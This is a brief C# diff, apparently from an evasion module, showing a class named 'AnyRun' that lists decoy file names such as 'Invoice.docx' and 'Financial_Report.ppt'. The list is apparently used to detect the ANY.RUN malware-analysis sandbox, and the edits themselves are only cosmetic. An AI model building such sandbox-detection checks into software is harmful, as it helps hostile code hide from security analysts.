@@ -1,9 +1,9 @@
-﻿using Utilities;
+﻿using InstallerUtils;
 
-namespace LannEvasion.Checks; 
+namespace LannEvasion.Checks;
 
 public class AnyRun : Check {
-    private static readonly List<string> fileNames = new List<string>() {
+    private static readonly List<string> fileNames = new() {
         "Invoice.docx",
         "Financial_Report.ppt",
         "Incidentx.pptx",
